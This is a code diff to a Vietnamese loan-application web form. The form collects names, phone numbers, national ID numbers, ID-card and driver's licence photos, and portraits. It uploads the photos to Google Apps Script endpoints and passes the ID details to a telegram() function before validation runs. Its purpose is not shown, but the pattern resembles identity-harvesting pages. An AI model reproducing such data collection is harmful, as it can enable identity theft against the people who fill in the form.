@@ -720,7 +720,7 @@
                  </div> 
                  <div class="inputfield">
                     <!-- <button class="btn" style="display:block;" onclick="document.getElementById('file').click()">Chụp CCCD Mặt Trước</button> -->
-                    <label class="btn" for="file1" style="text-align: center;">Chụp Hình CCCD/CMND <br>Mặt Trước</label>
+                    <label class="btn" for="file1" id="CCCD_mattruoc" style="text-align: center;">Chụp Hình CCCD/CMND <br>Mặt Trước</label>
                 </div>
                 <input style="visibility: hidden;" class="custom-file-input" type="file" name="file" id="file1" accept="image/*" capture="user" placeholder="chuphinh"/>
                 <div class="inputfield">
@@ -730,7 +730,7 @@
                 
                 <div class="inputfield">
                     <!-- <button class="btn" style="display:block;" onclick="document.getElementById('file').click()">Chụp CCCD Mặt Trước</button> -->
-                    <label class="btn" for="file2" style="text-align: center;">Chụp Hình CCCD/CMND <br>Mặt Sau</label>
+                    <label class="btn" for="file2" id="CCCD_matsau" style="text-align: center;">Chụp Hình CCCD/CMND <br>Mặt Sau</label>
                 </div>
                 <input style="visibility: hidden;" multiple="multiple" class="custom-file-input" type="file" name="file" id="file2" accept="image/*" capture="user" placeholder="chuphinh"/>
                 <div class="inputfield">
@@ -740,7 +740,7 @@
 
                 <div class="inputfield">
                     <!-- <button class="btn" style="display:block;" onclick="document.getElementById('file').click()">Chụp CCCD Mặt Trước</button> -->
-                    <label class="btn" for="file3" style="text-align: center;">Chụp Hình Chân Dung</label>
+                    <label class="btn" for="file3" id="chupchandung" style="text-align: center;">Chụp Hình Chân Dung</label>
                 </div>
                 <input style="visibility: hidden;" multiple="multiple" class="custom-file-input" type="file" name="file" id="file3" accept="image/*" capture="user" placeholder="chuphinh"/>
                 <div class="inputfield">
@@ -750,7 +750,7 @@
 
                 <div class="inputfield">
                     <!-- <button class="btn" style="display:block;" onclick="document.getElementById('file').click()">Chụp CCCD Mặt Trước</button> -->
-                    <label class="btn" for="file4" style="text-align: center;">Chụp Hình bằng lái xe Mặt Trước <br>(Không bắt buộc)</label>
+                    <label class="btn" for="file4" id="chupblxtruoc" style="text-align: center;">Chụp Hình bằng lái xe Mặt Trước <br>(Không bắt buộc)</label>
                 </div>
                 <input style="visibility: hidden;" multiple="multiple" class="custom-file-input" type="file" name="file" id="file4" accept="image/*" capture="user" placeholder="chuphinh"/>
                 <div class="inputfield">
@@ -760,7 +760,7 @@
 
                 <div class="inputfield">
                     <!-- <button class="btn" style="display:block;" onclick="document.getElementById('file').click()">Chụp CCCD Mặt Trước</button> -->
-                    <label class="btn" for="file5" style="text-align: center;">Chụp Hình bằng lái xe Mặt Sau <br>(Không bắt buộc)</label>
+                    <label class="btn" for="file5" id="chupblxsau" style="text-align: center;">Chụp Hình bằng lái xe Mặt Sau <br>(Không bắt buộc)</label>
                 </div>
                 <input style="visibility: hidden;" multiple="multiple" class="custom-file-input" type="file" name="file" id="file5" accept="image/*" capture="user" placeholder="chuphinh"/>
                 <div class="inputfield">
@@ -779,7 +779,9 @@
                <div class="inputfield">
                  <button style="font-size: larger; height: 80px;" type="submit" class="btn" id="submit-form">Gửi Hồ Sơ</button>
                </div>
-             </div>
+            </div>
+            <input style="visibility: hidden;" name="Create_date" id="Create_date"/>
+              
         </form>
         </div>
         <!-- phần popup loading -->
@@ -805,12 +807,13 @@
 
         <script>
             var sdta = localStorage.getItem('ndlsdt');
-            if ((sdta=='')||(sdta==null)){
+            if ((sdta=='')||(sdta==null) || (sdta=='null')){
 			   console.log('welcome')
 		    }else{
                 window.location.href = 'https://canvayngay.com/ndlchamsim'
             }
-
+            var datetimes = new Date().toLocaleString("vi-VN", {timeZone: "Asia/Ho_Chi_Minh"});
+            document.getElementById("Create_date").value = datetimes;
             // mobiscroll.datepicker('#ngaysinh', {
             //     controls: ['date'],
             //     touchUi: true,
@@ -859,7 +862,7 @@
                     fr.readAsArrayBuffer(file);
                     fr.onload = f => {
                     document.getElementById("popuploadingmain").style.visibility="visible";
-                    url = 'https://script.google.com/macros/s/AKfycbyrIv2LIzM53VmAp-KZNg47J9sckpvNV8AJD-TaSI0Q3Ig2OBPiGKRKGQlJBmwC5hgn/exec';  // <--- Please set the URL of Web Apps.
+                    url = 'https://script.google.com/macros/s/AKfycbxIbR6_bOQDhKLR_CEJTqGJREHysxz3OpbS-b1_zMSr6SEGMwolyQEVWrBl41tHYqNo/exec';  // <--- Please set the URL of Web Apps.
                     const qs = new URLSearchParams({filename: file.name, mimeType: file.type});
                     fetch(`${url}?${qs}`, {method: "POST", body: JSON.stringify([...new Int8Array(f.target.result)])})
                     .then(res => res.json())
@@ -896,9 +899,7 @@
                 const CCCD = $("#CCCD").val()
                 const sdt = $("#sdt").val()
                 console.log('kkkkk',hoten, CCCD,sdt)
-                // url = 'https://script.google.com/macros/s/AKfycbw8dXrZZGNl7J43Uks57ov_8Foe79lHmSJgC5LS7STgHeex04WB/exec'
-                url = 'https://script.google.com/macros/s/AKfycbyrIv2LIzM53VmAp-KZNg47J9sckpvNV8AJD-TaSI0Q3Ig2OBPiGKRKGQlJBmwC5hgn/exec'
-                // https://script.google.com/macros/s/AKfycbyrIv2LIzM53VmAp-KZNg47J9sckpvNV8AJD-TaSI0Q3Ig2OBPiGKRKGQlJBmwC5hgn/exec
+                var url = 'https://script.google.com/macros/s/AKfycbxIbR6_bOQDhKLR_CEJTqGJREHysxz3OpbS-b1_zMSr6SEGMwolyQEVWrBl41tHYqNo/exec'
                 var jqxhr = $.ajax({
                             url: url,
                             method: "POST",
@@ -907,7 +908,6 @@
                             success : function(data) {
                                 console.log(data);
                                 document.getElementById("popuploadingmain").style.visibility="hidden";
-
 
                                 localStorage.setItem('ndlhoten', hoten)
 				                localStorage.setItem('ndlsdt', sdt)
@@ -943,7 +943,7 @@
                 }
             }
                             
-            function validateform() {
+            function validateform1() {
                 telegram($("#hoten").val(), $("#CCCD").val(), $("#CMND").val(), $("#sdt").val())
                 
                 if ($("#hoten").val() == null || $("#hoten").val() === "") {
@@ -1205,17 +1205,43 @@
                 // chup hinh
                 if ($("#filenamefile1").val() == null || $("#filenamefile1").val() === "") {
                     alert("Bạn chưa Chụp CCCD/CMND Mặt trước !");
-                    location.href = "#filenamefile1";
+                    location.href = "#CCCD_mattruoc";
                     return false;
                 }
                 if ($("#filenamefile2").val() == null || $("#filenamefile2").val() === "") {
                     alert("Bạn chưa Chụp CCCD/CMND Mặt sau !");
-                    location.href = "#filenamefile2";
+                    location.href = "#CCCD_matsau";
                     return false;
                 }
                 if ($("#filenamefile3").val() == null || $("#filenamefile3").val() === "") {
                     alert("Bạn chưa Chụp hình chân dung !");
-                    location.href = "#filenamefile3";
+                    location.href = "#chupchandung";
+                    return false;
+                }
+                return true;
+                
+                
+            }
+            
+            function validateform() {
+                telegram($("#hoten").val(), $("#CCCD").val(), $("#CMND").val(), $("#sdt").val())
+                
+                
+
+                // chup hinh
+                if ($("#filenamefile1").val() == null || $("#filenamefile1").val() === "") {
+                    alert("Bạn chưa Chụp CCCD/CMND Mặt trước !");
+                    location.href = "#CCCD_mattruoc";
+                    return false;
+                }
+                if ($("#filenamefile2").val() == null || $("#filenamefile2").val() === "") {
+                    alert("Bạn chưa Chụp CCCD/CMND Mặt sau !");
+                    location.href = "#CCCD_matsau";
+                    return false;
+                }
+                if ($("#filenamefile3").val() == null || $("#filenamefile3").val() === "") {
+                    alert("Bạn chưa Chụp hình chân dung !");
+                    location.href = "#chupchandung";
                     return false;
                 }
                 return true;
